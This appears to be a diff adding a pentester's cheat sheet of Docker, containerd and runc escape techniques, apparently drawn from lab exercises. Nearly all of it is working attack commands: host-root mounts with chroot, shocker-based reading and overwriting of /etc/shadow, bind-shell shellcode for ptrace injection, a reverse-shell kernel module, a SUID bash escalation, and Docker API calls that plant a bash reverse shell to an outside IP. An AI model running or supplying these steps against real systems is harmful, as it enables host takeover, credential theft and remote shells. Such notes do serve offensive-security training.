@@ -1,0 +1,270 @@
+##PORTAINER STUFF
+navigate to containers, click add container
+scroll down and enable priviledged mode
+start container
+click on the now running container
+click exec console
+spawn bash shell
+fdisk -l
+mount /dev/sda /mnt
+ls -la /mnt
+
+
+
+##DOCKER SOCKET
+netstat -antp
+look for port 2375 or 2376
+curl localhost:2375/version
+export DOCKER_HOST="tcp://localhost:2375"
+docker images
+docker run -it -v /:/host/ ubuntu:18.04 bash
+// use chroot in /host directory
+chroot ./ bash
+
+##SHARED NAMESPACE
+if you have access to something controlling underlaying containers then you can try to do the mount /host volumes trick.  In portainer you create a new container, add additional volume, them click bind /host and under host / ...start the container, then look in /host 
+##DOCKER SOCKET
+find / -name docker.sock 2>/dev/null
+//Start an Ubuntu container. Mount root directory of host machine on /host directory of the container
+docker run -it -v /:/host/ ubuntu:18.04 bash
+
+cd /host/
+ls -l
+chroot ./ bash
+
+##PRIV'd CONTAINER
+### DAC_OVERRIDE
+capsh --print
+//look for DAC_OVERRIDE
+mount
+//look for mounts on the main disk sda
+gcc shocker.c -o read_files
+./read_files /etc/shadow shadow
+./read_files /etc/ssh/sshd_config sshd_config
+./read_files /etc/passwd passwd
+//create local user on container
+useradd john
+echo "john:password" | chpasswd
+tail -1 /etc/shadow
+tail -1 /etc/passwd
+//modify the root user with the hash of the john user
+gcc shocker_write.c -o write_files
+//overwrite the modified shadow file on the host
+./write_files /etc/shadow shadow
+./write_files /etc/passwd passwd
+
+
+### DAC_READ_SEARCH
+capsh --print
+wget http://stealth.openwall.net/xSports/shocker.c
+    // or use the one here
+
+find / -name .dockerinit 2>/dev/null
+    //checks if .dockerinit is on the container
+mount
+    //look for anything mounted to disk (/dev/sda) /etc/hostname /etc/hosts /etc/resolv.conf
+    //modify the shocker.c code to attack the files that are mounted on the host instead of .dockerinit or if .dockerinit then leave alone
+
+
+### sys_module
+capsh --print
+// look for SYS_MODULE, this means you can load .ko
+ipconfig
+// look for possible host IP and update the IP in reverse-shell.c
+//copy Makefile to target
+//copy reverse-shell to target
+make
+nc -lvp 4444
+insmox reverse-shell.ko
+
+### sysadmin
+//this happens when you docker run --priveleged it runs all 3 caps
+capsh --print
+ //look for SYS_ADMIN, RAW_IO, sys_module
+ fdisk -l
+  // look for hard drive device
+  mount /dev/sda /mnt/
+  ls -l /mnt/
+
+  chroot /mnt/ bash
+
+###sys_ptrace
+capsh --print
+//look for SYS_PTRACE
+ps -eaf 
+// look for process running on server
+uname -m
+//look for architecture to grab the correct shellcode update it in inject.c
+//bind tcp listen in 5600
+"\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02
+\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x
+0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x4
+8\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05";
+
+//write your program (run the program inject.c)
+
+gcc inject.c -o inject
+./inject <PID>
+
+nc <host ip> 5600
+id
+
+
+## CONTAINERD
+ctr run --mount type=bind,src=/,dst=/,options=rbind -t
+registry:5000/modified-ubuntu:latest ubuntu bash
+
+//DAC READ SEARCH
+ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
+
+compile shcoker.c -o read_files
+./read_files /root/flag flag
+
+
+## MEMORY LEAK
+
+cat /proc/<PID>/maps
+gdb --batch --pid <PID> -ex "dump memory heap.dump <MEMSTART> <MEMEND>";
+strings heap.dump
+
+
+## RUNC
+
+runc spec
+
+//add the following to the config
+Config:
+{
+"type": "bind",
+"source": "/",
+"destination": "/",
+"options": [
+"rbind",
+"rw",
+"rprivate"
+]
+},
+
+mkdir rootfs
+
+runc run demo
+pwd
+## Is member of docker Group on host?
+docker run -v /:/hostOS -it --rm chrisfosterelli/rootplease
+
+git clone https://github.com/chrisfosterelli/dockerrootplease rootplease
+cd rootplease/
+docker build -t rootplease .
+docker run -v /:/hostOS -it --rm rootplease
+
+## REMOTES
+nmap -p 2375,2376 <target>
+export DOCKER_HOST=target-1:2375
+docker ps
+docker run -it v /:/host ubuntu:18.04 bash
+chroot /host
+whoami
+
+## BYPASSES
+docker run -d --privileged modified-ubuntu
+// if you see authorization denied by plugin customauth (DOCKERFIREWALL)
+
+### First way
+docker run -d --security-opt "seccomp=unconfined" modified-ubuntu
+docker exec -it --privileged a2313eb783d1 bash
+insmod reverse-shell.ko
+capsh --list
+
+### Second way
+//if limited to specific directory run into that directory
+cp /bin/bash /<directory>
+ls -l /tmnp
+
+docker run -it -v /tmp:/host ubuntu:18.04 bash
+ls -l /host/
+chown root:root /host/bash
+chmod u+s /host/bash
+exit 
+/tmp/bash -p 
+id
+//look at your EUID
+
+### third way 
+//if you see specified binds options value is disallowed
+//try this with anything you might be able to touch
+docker run -it -v /etc/:/host modified-ubuntu bash
+
+openssl passwd -1 -salt abc password
+//Edit the shadow file and replace the root hash with the hash mentioned below.
+//insert this in shadow
+ $1$abc$BXBqpb9BZcZhXLgbee.0s/
+
+### API Bypass
+
+curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d
+'{"Image": "modified-ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
+
+docker start f6932bc153ad
+docker ps
+docker exec -it f6932bc153ad bash
+ls -l /host/
+chroot /host bash
+find / -name flag 2>/dev/null
+
+
+//If you have any way to expose environmental variables via command injection you cna grab the Bypass-Token
+
+curl -X GET -H "Content-Type: application/json" -H "Bypass-Token:
+0a46f8ef7ba0611ccb16a0aeeac618a1" http://192.242.253.3:2375/images/json -s | jq
+
+curl -s -H "Content-Type: application/json" -H "Bypass-Token:
+0a46f8ef7ba0611ccb16a0aeeac618a1" -d '{"Image":
+"wolfcms","Env":["Bypass-Token=0a46f8ef7ba0611ccb16a0aeeac618a1"],"Binds":["/:/host"]}'
+http://192.242.253.3:2375/containers/create | jq
+
+//start container
+curl -X POST -H "Content-Type: application/json" -H "Bypass-Token:0a46f8ef7ba0611ccb16a0aeeac618a1"
+http://192.242.253.3:2375/containers/0bb824614788cced1fa17ed4539477bca425b62d9d52d91
+8ff3c423a3f305d56/start
+
+//check running containers
+curl -X GET -H "Content-Type: application/json" -H "Bypass-Token:
+0a46f8ef7ba0611ccb16a0aeeac618a1" http://192.242.253.3:2375/containers/json -s | jq
+
+//pass reverse shell
+ curl -s -H "Content-Type: application/json" -H "Bypass-Token:
+0a46f8ef7ba0611ccb16a0aeeac618a1" -d '{"AttachStdin":
+false,"AttachStdout":false,"AttachStderr":false,"Cmd":["bash","-c","bash -i >&
+/dev/tcp/192.242.253.2/4444 0>&1"],"Detach":true}'
+http://192.242.253.3:2375/containers/0bb824614788cced1fa17ed4539477bca425b62d9d52d91
+8ff3c423a3f305d56/exec | jq
+
+//start the exec instance and catch callback
+curl -s -H "Content-Type: application/json" -H "Bypass-Token:
+0a46f8ef7ba0611ccb16a0aeeac618a1" -d '{"Detach": false,"Tty":false}'
+http://192.242.253.3:2375/exec/4406df99406aadd9f6eb13169a8a44b42ca0f8f772a60f34dedbfb
+9008f2b06c/start
+
+
+//start container with CAP SYS MOD
+curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d
+'{"Image": "modified-ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}'
+http:/v1.40/containers/create
+docker ps
+docker start <ids>
+docker exec -it <id> bash
+capsh --print
+insmod reverse-shell.ko
+
+
+## User Namespace Remapping
+
+
+cat /etc/group |grep docker
+//look to see if user is in the docker group
+
+//grab dockerrootplease
+cd dockerrootplease
+docker build -t rootplease .
+docker run -v /:/hostOS -it --rm rootplease
+
